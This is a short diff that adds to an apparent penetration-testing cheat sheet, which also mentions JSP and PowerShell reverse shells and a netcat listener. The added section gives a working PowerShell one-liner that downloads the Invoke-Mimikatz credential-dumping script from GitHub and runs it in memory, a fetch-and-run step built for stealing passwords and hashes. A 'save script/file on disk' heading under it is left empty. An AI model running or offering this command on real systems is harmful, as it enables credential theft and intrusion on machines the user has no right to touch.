@@ -88,6 +88,16 @@ Kali JSP Reverse Shell:
 
 ## Powershell
 
+### load script in memory
+
+```
+IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1') ;
+```
+
+### save script/file on disk
+
+
+
 ### PowerShell Reverse Shells
 
 setup a netcat listener:
